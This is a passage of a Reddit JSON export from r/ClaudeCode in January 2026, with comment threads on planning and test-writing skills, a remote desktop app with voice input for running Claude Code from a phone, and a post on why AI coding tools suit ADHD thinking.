how I would actually write tests if was me doing the coding.",
              "score": 1,
              "created_utc": "2026-01-15 15:21:27",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzqpmjc",
                  "author": "KingPonzi",
                  "text": "God bless you bro, Iâ€™ll review those links.",
                  "score": 1,
                  "created_utc": "2026-01-15 15:24:01",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzpz3ie",
          "author": "fast-90",
          "text": "Would you be willing to share (part) of your planning SKILLS.md? Or tips on what (not) to do when defining skills?",
          "score": 1,
          "created_utc": "2026-01-15 13:04:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqklph",
              "author": "No_Paramedic_4881",
              "text": "[https://github.com/rileyhilliard/claude-essentials](https://github.com/rileyhilliard/claude-essentials)  \nI actually fully open sourced my generic set of skills and commands. The one I think you're looking for is the [writing-plans](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-plans/SKILL.md) skill. Looking through this repo should give you a good idea on best-ish practices (in my *subjective* opinion) for making skills. The format of these is heavily influenced from the official Anthropic guidance: [https://code.claude.com/docs/en/skills](https://code.claude.com/docs/en/skills), which is a great read if you havn't come across that yet",
              "score": 1,
              "created_utc": "2026-01-15 15:00:02",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzscyt4",
          "author": "HikariWS",
          "text": "TDD never worked for me. It doesn't work before I have component's interface, and when I have it it's just easier to construct its effectively than to write tests first to only then construct it. After it's constructed, then I write tests, and Claude is great for that. I tell it to write tests as it wishes, then tell it the tests I see important.\n\nI always commit before telling it to do stuff, then after it writes the tests I compare to see if it changed anything on the module. I have an instruction for it to never do it and so far it never did. The worse I've got was a config to enable a validation and it disabled by config on the test instead of fixing the test - yes it was the test code that was bugged.",
          "score": 1,
          "created_utc": "2026-01-15 19:51:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzu9qdq",
          "author": "fabientt1",
          "text": "Long life to you dude, planning has been the best resource I have included for the past 3 days, I created SOP, Agents, Git and resources to a better performance, reducing the back and fort for at least 47%. \n\nThank you",
          "score": 1,
          "created_utc": "2026-01-16 01:36:30",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzw7m8b",
          "author": "selldomdom",
          "text": "Hi everyone, I just released a Test Driven AI development Extension for VS Code and Cursor. \n\nI am actualy not a developer but a tester and pretty new in open sourcing a project.  \n  \nI hope it helps someone.  \n  \nI would appreciate and feedback.  \n  \n[https://github.com/zd8899/TDAD](https://github.com/zd8899/TDAD)",
          "score": 1,
          "created_utc": "2026-01-16 09:56:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o043hkn",
          "author": "cianuro",
          "text": "Could you share some more detail on how you handle integration tests? This is a constant problemfor me with agents and I don't know where to start. Any idiot friendly resources?",
          "score": 1,
          "created_utc": "2026-01-17 14:54:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0e16v5",
              "author": "No_Paramedic_4881",
              "text": "[https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-tests/SKILL.md](https://github.com/rileyhilliard/claude-essentials/blob/main/plugins/ce/skills/writing-tests/SKILL.md)  \nI created a dedicated skill for this ðŸ‘†. By default, Claude wants to write Unit tests, and it wants to mock *everything,* so I often find the default tests it writes are pretty trash. The skill above puts guardrails on it to write tests like I would write tests. \n\n[https://github.com/rileyhilliard/claude-essentials/blob/main/docs/extending-for-projects.md#2-referencing-ce-skills-in-rules](https://github.com/rileyhilliard/claude-essentials/blob/main/docs/extending-for-projects.md#2-referencing-ce-skills-in-rules)  \nUse this guide ðŸ‘† to help auto apply skills to file patterns, so you can glob match your test files and apply the test-writing skill it them whenever Claude works on a test",
              "score": 1,
              "created_utc": "2026-01-19 00:33:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0ct8lz",
          "author": "Adorable_Bank_4198",
          "text": "Great post. Are you willing to share your skills/agents? Would love to see how they're structured. Thanks!",
          "score": 1,
          "created_utc": "2026-01-18 20:47:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0e2xnh",
              "author": "No_Paramedic_4881",
              "text": "[https://github.com/rileyhilliard/claude-essentials](https://github.com/rileyhilliard/claude-essentials)  \nI open sourced my generic commands / agents / skills ðŸ‘†  \nAnd made a guide on how to tune them to your repository ðŸ‘‡  \n[https://github.com/rileyhilliard/claude-essentials/blob/main/docs/extending-for-projects.md](https://github.com/rileyhilliard/claude-essentials/blob/main/docs/extending-for-projects.md)",
              "score": 1,
              "created_utc": "2026-01-19 00:42:41",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzntos2",
          "author": "AphexPin",
          "text": "no you haven't, Claude Code hasn't even been available that long. stopped reading on the first sentence",
          "score": -12,
          "created_utc": "2026-01-15 02:50:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "nznuf30",
              "author": "Careless_Bat_9226",
              "text": "Seems like you didnâ€™t read the full sentence?",
              "score": 7,
              "created_utc": "2026-01-15 02:55:06",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzo04cj",
                  "author": "AphexPin",
                  "text": "I did indeed! Maybe learn to read?",
                  "score": -6,
                  "created_utc": "2026-01-15 03:29:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nznu74q",
              "author": "No_Paramedic_4881",
              "text": "Read it again, I didnâ€™t say that\n\nâ€œand other agentic coding tools (in the pre claude code era)â€",
              "score": 5,
              "created_utc": "2026-01-15 02:53:48",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzo01ty",
                  "author": "AphexPin",
                  "text": "The statement is still false, do you not know what 'and' means?",
                  "score": -4,
                  "created_utc": "2026-01-15 03:29:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nznvnyi",
              "author": "ggone20",
              "text": "This guy? Lol\n\nAider was pretty dope before the CC/Codex days. I still find value in the plan/execute pattern it kind of pioneered over just letting CC/Codex do its thing. At this point Iâ€™m talking about changes not feature or system planning.",
              "score": 6,
              "created_utc": "2026-01-15 03:02:27",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzny5nz",
                  "author": "No_Paramedic_4881",
                  "text": "Aider has been on my 'try it' list for a while. In particular I wanted to see if I could get any OSS coding models working in a 'claude code' like environment. Last time I tried that was >6 mo ago and the quality was too far off closed source to be useable, but I never really thought of trying that for trivial or maybe even just planning (or plan review) type tasks.\n\nSomething interesting I did try recently, I bought the 60% off yearly Gemini sale deal. That comes with being able to use gemini cli. I was pretty disappointed with the quality of Gemini CLI, like I didn't have big expectations, but it didn't meet my lowest expectations haha. But what I have been playing with is creating a claude skill to hand off plug-and-chug tasks off to gemini cli to execute. Basically having the skill setup the context that Gemini is an intern that doesn't know what it's doing and need mad guidance, then handing it tasks like documentation updating or trivial testing tasks. I wonder if it could interface with Aider similarly",
                  "score": 3,
                  "created_utc": "2026-01-15 03:17:32",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "nzo0n8w",
                  "author": "AphexPin",
                  "text": "Can you not read? The opening sentence is categorically false, i.e impossible.",
                  "score": -4,
                  "created_utc": "2026-01-15 03:32:49",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qd48fb",
      "title": "Using Claude Code from bed â€” made a remote desktop app with voice input",
      "subreddit": "ClaudeCode",
      "url": "https://i.redd.it/p584nr6aoedg1.jpeg",
      "author": "TerseCat",
      "created_utc": "2026-01-15 00:15:33",
      "score": 152,
      "num_comments": 69,
      "upvote_ratio": 0.9,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Showcase",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qd48fb/using_claude_code_from_bed_made_a_remote_desktop/",
      "domain": "i.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "nznmt9j",
          "author": "Timzor",
          "text": "Terminus and Tmux do it for me, plus Tailscale when Iâ€™m out of the house",
          "score": 19,
          "created_utc": "2026-01-15 02:10:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nznzjnm",
              "author": "zmust3rd",
              "text": "Seconding this. Terminus and tmux work great for this.",
              "score": 7,
              "created_utc": "2026-01-15 03:26:04",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nznzndj",
              "author": "Mikeshaffer",
              "text": "Yeah. Speech to text works fine with that set up. I wonder whatâ€™s different here? Voice to text even works in vanilla vnc",
              "score": 1,
              "created_utc": "2026-01-15 03:26:43",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzp93oe",
                  "author": "TerseCat",
                  "text": "As far as I know VNC doesnâ€™t transmit audio, maybe you mean iOS dictation? I couldnâ€™t get that to work smoothly, and I imagine itâ€™d be clunky anyway. The voice input here is push-to-talk style, built specifically for prompting.\n\nssh works great if youâ€™re pure command line, but the moment you need to check something in a browser, simulator, or any GUI, you hit a wall.",
                  "score": 1,
                  "created_utc": "2026-01-15 09:33:24",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzu34xl",
              "author": "faux_sheau",
              "text": "Ditto!\n\nBut I bought a cheap $5 / mo VPS from Hetzner. Added benefit is I now have a standard coding environment across my phone, laptop, PC which has been great.\n\nOnly issue is with some CLIs I canâ€™t scroll? OpenCodeâ€™s scrolling works though but the screen gets a bit crowded.",
              "score": 1,
              "created_utc": "2026-01-16 00:59:15",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzn2kwb",
          "author": "CarpMadMan",
          "text": "Thought about building this but then I found happy.engineering - game changer for sure. Love being able to get work done on the go.",
          "score": 18,
          "created_utc": "2026-01-15 00:16:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzn3g6d",
              "author": "TerseCat",
              "text": "definitely love the domain haha. will try it out",
              "score": 4,
              "created_utc": "2026-01-15 00:21:21",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "nzp9z9f",
              "author": "Vast_Storage2706",
              "text": "Happy it s looks like scam to get your personal data, and Incomplete application, more\nbugs \n\nwhatever better than this",
              "score": 2,
              "created_utc": "2026-01-15 09:42:00",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzs04v3",
                  "author": "natandestroyer",
                  "text": "Happy is sussy but I've used it and it works",
                  "score": 1,
                  "created_utc": "2026-01-15 18:52:38",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o03284s",
                  "author": "vago8080",
                  "text": "Care to elaborate?",
                  "score": 1,
                  "created_utc": "2026-01-17 10:34:59",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzp2zf2",
              "author": "Happy-Profession-256",
              "text": "Does this work for Claude in cursor?",
              "score": 1,
              "created_utc": "2026-01-15 08:33:32",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzp7ti9",
                  "author": "TerseCat",
                  "text": "Yep! It streams your whole Mac screen, so Cursor, Claude Code, VS Code, anything works.",
                  "score": 1,
                  "created_utc": "2026-01-15 09:20:41",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzne3xi",
          "author": "ObscureAintSecure",
          "text": "Oh very nice! Just need a Windows companion app too so I can try. :-)",
          "score": 5,
          "created_utc": "2026-01-15 01:20:34",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzp9h4r",
              "author": "TerseCat",
              "text": "thx. noted. will make one if there is enugh interest",
              "score": 2,
              "created_utc": "2026-01-15 09:37:04",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznpjs4",
          "author": "BrokenInteger",
          "text": "Any chance of an android app?",
          "score": 7,
          "created_utc": "2026-01-15 02:26:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzorghd",
              "author": "Historical-Lie9697",
              "text": "https://termux.dev/en/ We get our own sandboxed Linux environment. Claude/Codex work great and with the add-ons you can style your terminals, launch agents/run scripts from shortcuts on your apps screen, schedule jobs with termux api (I have claude update a news page every night).. And now that I look at these api docs again, you can really turn Claude into a personal assistant if you wanted with https://wiki.termux.com/wiki/Termux:API by turning it into a skill or agent or mcp",
              "score": 2,
              "created_utc": "2026-01-15 06:48:17",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzp9udy",
              "author": "TerseCat",
              "text": "notedðŸ«¡ will do soon if there is enough interest",
              "score": 1,
              "created_utc": "2026-01-15 09:40:41",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o0b45ch",
              "author": "TerseCat",
              "text": "BTW, feel free to join the newsletter on [https://afkdev.app/](https://afkdev.app/) to get notified when I make the android version. It will also help me to gauge interest and prioritise things. Thx",
              "score": 1,
              "created_utc": "2026-01-18 15:58:38",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzn3wa7",
          "author": "MessageEquivalent347",
          "text": "Hey dude, I am interested in testing your app. Sounds cool, Im especially interested in voice input. This is something I wanted to build myself but for macos/windows, didn't work as expected hah.",
          "score": 2,
          "created_utc": "2026-01-15 00:23:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzn6s2f",
              "author": "TerseCat",
              "text": "Nice! Yeah voice input was the main thing I built it for â€” typing prompts on a phone is brutal. Here's the link: https://afkdev.app/. Let me know how it goes, happy to hear feedback! (either DM or reply)",
              "score": 5,
              "created_utc": "2026-01-15 00:39:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznd5qm",
          "author": "Acceptable_Bend_5200",
          "text": "I tried the tailscale bridge but wasnt really enjoying the input. Id be down to give this a try.",
          "score": 2,
          "created_utc": "2026-01-15 01:15:08",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpav3v",
              "author": "TerseCat",
              "text": "Yeah, voice input makes a lot of difference. Let me know how it goes!",
              "score": 1,
              "created_utc": "2026-01-15 09:50:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzq3aka",
          "author": "prc41",
          "text": "Chrome Remote Desktop latest update is ðŸ”¥. That plus Wispr Flow is all you need. I can easily run my 4 Claude terminals on the go with this setup.",
          "score": 2,
          "created_utc": "2026-01-15 13:29:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzn65to",
          "author": "Miserable_Review_756",
          "text": "What's the link",
          "score": 1,
          "created_utc": "2026-01-15 00:35:59",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzn6xav",
              "author": "TerseCat",
              "text": "Here it is: [https://afkdev.app/](https://afkdev.app/)",
              "score": 3,
              "created_utc": "2026-01-15 00:40:09",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzondnr",
                  "author": "Miserable_Review_756",
                  "text": "Apologies I'm android. All good.",
                  "score": 1,
                  "created_utc": "2026-01-15 06:13:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nznh8ao",
          "author": "egyptianmusk_",
          "text": "This looks amazing!",
          "score": 1,
          "created_utc": "2026-01-15 01:38:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nznihd0",
          "author": "egyptianmusk_",
          "text": "Thanks OP. \nIf this is my first foray into using Claude Code i'm so psyched. \n\nI don't know how to code.  I'm good at using software, API integrations etc, I know what I want in an app, I'm good at talking and I'm also good at copying and pasting. \n\nIs this going work for me?",
          "score": 1,
          "created_utc": "2026-01-15 01:45:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzp73f6",
              "author": "TerseCat",
              "text": "Yeah. You talk, Claude codes, you check if it works. I would suggest you still to learn abit code at some point, so that you review the work better.",
              "score": 1,
              "created_utc": "2026-01-15 09:13:32",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznpqcy",
          "author": "AztheWizard",
          "text": "Excited to give it a shot",
          "score": 1,
          "created_utc": "2026-01-15 02:27:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzp62q6",
              "author": "TerseCat",
              "text": "Let me know how it goes! ðŸ™Œ",
              "score": 1,
              "created_utc": "2026-01-15 09:03:27",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznpuv9",
          "author": "Laxmin",
          "text": "Couch programming. \n\nI love it. We need a different vegetable to describe us.\n\nCouch Potatoes for TV; Couch Pumpkins for Programming",
          "score": 1,
          "created_utc": "2026-01-15 02:28:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpai9n",
              "author": "TerseCat",
              "text": "Couch Pumpkins ðŸ˜‚ Because there are seeds inside and can be fruitful?",
              "score": 1,
              "created_utc": "2026-01-15 09:47:06",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nznv2bs",
          "author": "RichUK82",
          "text": "Anyway to connect to the antigravity ide guys ?",
          "score": 1,
          "created_utc": "2026-01-15 02:58:55",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzp67gi",
              "author": "TerseCat",
              "text": "Havenâ€™t tried Antigravity specifically, but it works with anything running on your Mac â€” itâ€™s just streaming your screen.",
              "score": 1,
              "created_utc": "2026-01-15 09:04:45",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzp34tb",
          "author": "Happy-Profession-256",
          "text": "Able to connect to Cursor?",
          "score": 1,
          "created_utc": "2026-01-15 08:35:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzp5ypc",
              "author": "TerseCat",
              "text": "Yep, works with anything on your Mac â€” Cursor, VS Code, Terminal, Xcode, whatever. Itâ€™s streaming your screen, so whatever you run locally works.",
              "score": 1,
              "created_utc": "2026-01-15 09:02:20",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzpiarf",
                  "author": "Happy-Profession-256",
                  "text": "Thanks for reply. Unable to use, since I donâ€™t own a Mac ðŸ˜¢. Windows here.",
                  "score": 1,
                  "created_utc": "2026-01-15 10:59:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzp5yn6",
          "author": "lawrencecoolwater",
          "text": "I will order one please",
          "score": 1,
          "created_utc": "2026-01-15 09:02:19",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzp6cxk",
          "author": "TheDataQuokka",
          "text": "Hey dude! Nice looks clean. Do you have a window client?",
          "score": 1,
          "created_utc": "2026-01-15 09:06:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzpa8ry",
              "author": "TerseCat",
              "text": "ios and macos only currently, which is my own stack. but definitely can make windows host if enough people want",
              "score": 1,
              "created_utc": "2026-01-15 09:44:34",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o0b4ou2",
              "author": "TerseCat",
              "text": "BTW, feel free to join the newsletter on [https://afkdev.app/](https://afkdev.app/) to get notified when I make the windows version. It will also help me to gauge interest and prioritise things. Thx",
              "score": 1,
              "created_utc": "2026-01-18 16:01:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nzpc99w",
          "author": "DraftedByMistake",
          "text": "Iâ€™m more interested in how you approached building this? did you use any specific libraries for voice inputs or maybe throws some light on overall working of it",
          "score": 1,
          "created_utc": "2026-01-15 10:03:57",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzqk48p",
          "author": "egyptianmusk_",
          "text": "Do you have do be on the same Wi-Fi network to use this?",
          "score": 1,
          "created_utc": "2026-01-15 14:57:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzqpioi",
              "author": "TerseCat",
              "text": "No, don't have to. Even work on cellular.",
              "score": 1,
              "created_utc": "2026-01-15 15:23:31",
              "is_submitter": true,
              "replies": [
                {
                  "id": "nzt8ql5",
                  "author": "makethishomesmartcom",
                  "text": "How is this working remotely? Does it have a middleman server it's hitting? I saw webrtc encrypted by default which is awesome.",
                  "score": 1,
                  "created_utc": "2026-01-15 22:18:32",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzqpozl",
          "author": "Away-Battle-5535",
          "text": "damn, that's interesting.",
          "score": 1,
          "created_utc": "2026-01-15 15:24:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzs3qa2",
          "author": "gabealmeida",
          "text": "I did something similar, but instead, I created a accessible website running Claude agent SDK, to replicate Claude code (with a little bit of my own agentic twist), but with React UI instead of terminal",
          "score": 1,
          "created_utc": "2026-01-15 19:08:39",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzt8fp7",
          "author": "makethishomesmartcom",
          "text": "Well done! Any support coming for multiple displays?",
          "score": 1,
          "created_utc": "2026-01-15 22:17:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "nztdipz",
              "author": "TerseCat",
              "text": "It streams the main display if there are multiple. And it should move the selected window into the main one automatically. My personal setup is one external monitor plus the macbook builtin one. It works pretty well.",
              "score": 1,
              "created_utc": "2026-01-15 22:42:08",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nztftwq",
          "author": "4444444vr",
          "text": "might be user error but can't figure out how to mouse click\n\nit's been real smooth though. I like it.\n\nEDIT: is working fine the second time I tried it. did you basically reproduce Jump Desktop? Impressive",
          "score": 1,
          "created_utc": "2026-01-15 22:53:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzx3rbn",
              "author": "TerseCat",
              "text": "Hey, great to hear that. I heard many others had similar issue when first time trying. Anything you have done before the you try the second time? It might be helpful for other users and for me to debug the issue. Thx.\n\nYeah, basically. I designed a bit my own protocol for the controlling, inspired by VNC standard. This opens up a lot of possibilities.",
              "score": 1,
              "created_utc": "2026-01-16 13:47:47",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nztxiic",
          "author": "victorrseloy2",
          "text": "!remindme tomorrow",
          "score": 1,
          "created_utc": "2026-01-16 00:28:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "nztxmrn",
              "author": "RemindMeBot",
              "text": "I will be messaging you in 1 day on [**2026-01-17 00:28:41 UTC**](http://www.wolframalpha.com/input/?i=2026-01-17%2000:28:41%20UTC%20To%20Local%20Time) to remind you of [**this link**](https://www.reddit.com/r/ClaudeCode/comments/1qd48fb/using_claude_code_from_bed_made_a_remote_desktop/nztxiic/?context=3)\n\n[**CLICK THIS LINK**](https://www.reddit.com/message/compose/?to=RemindMeBot&subject=Reminder&message=%5Bhttps%3A%2F%2Fwww.reddit.com%2Fr%2FClaudeCode%2Fcomments%2F1qd48fb%2Fusing_claude_code_from_bed_made_a_remote_desktop%2Fnztxiic%2F%5D%0A%0ARemindMe%21%202026-01-17%2000%3A28%3A41%20UTC) to send a PM to also be reminded and to reduce spam.\n\n^(Parent commenter can ) [^(delete this message to hide from others.)](https://www.reddit.com/message/compose/?to=RemindMeBot&subject=Delete%20Comment&message=Delete%21%201qd48fb)\n\n*****\n\n|[^(Info)](https://www.reddit.com/r/RemindMeBot/comments/e1bko7/remindmebot_info_v21/)|[^(Custom)](https://www.reddit.com/message/compose/?to=RemindMeBot&subject=Reminder&message=%5BLink%20or%20message%20inside%20square%20brackets%5D%0A%0ARemindMe%21%20Time%20period%20here)|[^(Your Reminders)](https://www.reddit.com/message/compose/?to=RemindMeBot&subject=List%20Of%20Reminders&message=MyReminders%21)|[^(Feedback)](https://www.reddit.com/message/compose/?to=Watchful1&subject=RemindMeBot%20Feedback)|\n|-|-|-|-|",
              "score": 1,
              "created_utc": "2026-01-16 00:29:20",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nzx8a82",
          "author": "VariableCritic",
          "text": "Share the link!",
          "score": 1,
          "created_utc": "2026-01-16 14:11:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzy6tdg",
              "author": "TerseCat",
              "text": "[https://afkdev.app/](https://afkdev.app/)",
              "score": 1,
              "created_utc": "2026-01-16 16:50:53",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o032jw8",
          "author": "vago8080",
          "text": "I canâ€™t trust a closed source vibed app that gets remote access to my computer.",
          "score": 1,
          "created_utc": "2026-01-17 10:38:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0399q1",
              "author": "TerseCat",
              "text": "Understood, trust takes time. Lots of popular closed-source Mac apps (Wispr Flow, Superwhisper, Raycast) also require the same accessibility permissions â€” some concerns are fair.\n\nI'm open to open-sourcing the Mac companion app down the line to build trust. Just want to keep some commercial viability so the project stays sustainable. But yeah, totally get the hesitation.",
              "score": 1,
              "created_utc": "2026-01-17 11:39:20",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o03f326",
                  "author": "vago8080",
                  "text": ">I'm open to open-sourcing the Mac companion app down the line to build trust.\n\nThat would make a lot of sense. Knowing what is being sent in and out of my computer.\n\n>Just want to keep some commercial viability so the project stays sustainable.\n\nNo issues there. Bills have to be paid.\n\n>Lots of popular closed-source Mac apps (Wispr Flow, Superwhisper, Raycast) also require the same accessibility permissions\n\nThat's why I don't use them without carefully vetting them previously. I would rather avoid getting drained overnight.",
                  "score": 1,
                  "created_utc": "2026-01-17 12:27:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0513oe",
          "author": "RoutineNet4283",
          "text": "Hey man, this is a good idea. I will try coding it for Android phone. I'm using DictationDaddy for voice input and Tmux for terminal access but a unified interface might be a better idea.",
          "score": 1,
          "created_utc": "2026-01-17 17:35:41",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0b3zyn",
              "author": "TerseCat",
              "text": "Thanks! Feel free to join the newsletter on [https://afkdev.app/](https://afkdev.app/) to get notified when I make the android version. It will also help me to gauge interest and prioritise things.",
              "score": 1,
              "created_utc": "2026-01-18 15:57:56",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "nztz4qu",
          "author": "pm_me_ur_doggo__",
          "text": "I think these setups are cool but everyone should at least try the default claude ios and android apps. I use the built in apple keyboard dictation. Each branch auto deploys to vercel so I can look at the results. I recently got it working with agent-browser so it can do testing. No need to mess around with worktrees because each thread is just a different VM on anthropics infrastructure.\n\nFor a while, I was starting my day literally in a hammock in the morning, then would transition to working at my laptop to refine work that was started in the claude app.",
          "score": 0,
          "created_utc": "2026-01-16 00:37:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzv6iww",
          "author": "martinsky3k",
          "text": "Just buy a cheap projector screen. It is so much better",
          "score": 0,
          "created_utc": "2026-01-16 04:48:01",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qeb6od",
      "title": "Why AI coding tools accidentally feel perfect for inattentive ADHD brains",
      "subreddit": "ClaudeCode",
      "url": "https://www.reddit.com/r/ClaudeCode/comments/1qeb6od/why_ai_coding_tools_accidentally_feel_perfect_for/",
      "author": "bystanderInnen",
      "created_utc": "2026-01-16 09:06:59",
      "score": 147,
      "num_comments": 61,
      "upvote_ratio": 0.91,
      "text": "A funny side effect of AI-assisted coding is that it seems to fit inattentive ADHD brains unusually well.\n\nThese brains are often bad at linear recall and memorization, but very good at pattern recognition, big-picture thinking, and creative problem solving. They also rely heavily on external context because internal state tends to get dropped. Forgetting isnâ€™t a bug, itâ€™s the default mode.\n\nWhich is basically how LLMs work.\n\nAI tools like Claude Code donâ€™t â€œrememberâ€ things either. They need exact context every time. They think in patterns, not facts. They generate plausible structure and then need verification. In other words, they operate in a way inattentive ADHD brains have been compensating for their entire lives.\n\nThe real win isnâ€™t that they write code. Itâ€™s that they externalize working memory and collapse activation cost. Reading a codebase, summarizing architecture, drafting tests, proposing refactors, updating docs all become cheap first passes instead of momentum killers.\n\nHallucinations arenâ€™t surprising here. Theyâ€™re familiar. You handle them the same way: verify, test, correct, repeat. Treat the output as untrusted and it works fine.\n\nSo itâ€™s kind of ironic. A lot of people struggle with AI because it â€œforgets thingsâ€ or â€œneeds constant context.â€ Meanwhile, some neurodivergent brains are like: yes, welcome to how this has always worked.\n\nNot AI replacing engineers. Just a tool that finally speaks fluent pattern-thinking.",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qeb6od/why_ai_coding_tools_accidentally_feel_perfect_for/",
      "domain": "self.ClaudeCode",
      "is_self": true,
      "comments": [
        {
          "id": "nzwf1el",
          "author": "nnennahacks",
          "text": "Completely agree.\n\nFor me, AI lets me think the way my brain already thinks without paying the burnout tax.\n\nMy brain runs at like a thousand tabs open all the time. Deep dives, tangents, pattern jumps, sudden connections. Normally, context switching kills momentum and drains me fast. With AI, I can bounce between ideas, explore them deeply, and externalize the chaos instead of trying to hold it all in my head.\n\nIt feels like I finally have somewhere to put the thoughts. I can dump everything out, explore aggressively, then decide whatâ€™s actually worth pulling back into my internal context. That part is huge. Itâ€™s freeing. It unlocks creativity as opposed to shutting it down.\n\nAI matches my operating system. For coding, brainstorming, strategizing, planning, learning, building. \n\nI get to operate on extreme mode â€œsystems thinkingâ€ and bottom up processing (especially when I use speech-to-text in my flow).\n\nMultiple things running at once, moving forward without getting stuck in friction. Micro-friction has blocked me from doing so much more than I could have in the past.\n\nItâ€™s not replacing judgment. Im using my good judgment far more frequently. Very opinionated and particular. So Itâ€™s giving me space to use it without exhaustion. \n\nHonestly, it just works.",
          "score": 20,
          "created_utc": "2026-01-16 11:01:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzwfi97",
          "author": "texo_optimo",
          "text": "That's how I adapted when my repos grew. Mega ADHD here and started to recognize the context limitations as I was learning more. I started with an ADHD prompting system, that evolved into CC agents utilizing the same framework. Then I started looking at it beyond prompting and as a method for managing context. Now I'm using my own governance remote mcp server / project board that serves as record of decisions and \"memory\" of sorts for architectural decisions across every project.  \n  \nI began to realize how I could \"parking lot\" ideas more easily if I managed my own context the same way. This let's me ideate and iterate on so many things that would have gone into the ether. It may sound corny, but utilizing LMs heavily have helped me see my constraint as a feature.",
          "score": 30,
          "created_utc": "2026-01-16 11:05:40",
